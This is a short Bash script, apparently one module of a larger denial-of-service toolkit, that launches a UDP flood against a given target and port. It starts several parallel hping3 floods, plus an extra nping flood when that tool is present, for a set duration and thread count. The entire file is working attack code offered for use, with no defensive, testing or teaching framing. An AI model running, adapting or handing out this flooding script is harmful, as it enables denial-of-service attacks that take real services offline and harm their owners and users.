#!/bin/bash

# UDP Flood Attack Module
source core/banner.sh

udp_flood() {
    local target=$1
    local port=$2
    local duration=$3
    local threads=$4
    
    echo -e "${CYAN}[UDP FLOOD]${NC} Starting UDP flood attack..."
    echo -e "${YELLOW}Target: $target:$port${NC}"
    echo -e "${YELLOW}Duration: $duration seconds${NC}"
    echo -e "${YELLOW}Threads: $threads${NC}"
    
    # Check if hping3 is available
    if ! command -v hping3 &> /dev/null; then
        echo -e "${RED}Error: hping3 not found. Please install hping3.${NC}"
        exit 1
    fi
    
    echo -e "${GREEN}Launching UDP flood...${NC}"
    
    for ((i=1; i<=threads; i++)); do
        {
            timeout $duration hping3 --udp -p $port -i u1000 $target > /dev/null 2>&1
        } &
    done
    
    # Alternative method using nping if available
    if command -v nping &> /dev/null; then
        {
            timeout $duration nping --udp -p $port -c 0 --rate 1000 $target > /dev/null 2>&1
        } &
    fi
    
    wait
    
    echo -e "${GREEN}UDP flood attack completed.${NC}"
}

# If script is called directly
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    udp_flood "$1" "$2" "$3" "$4"
fi

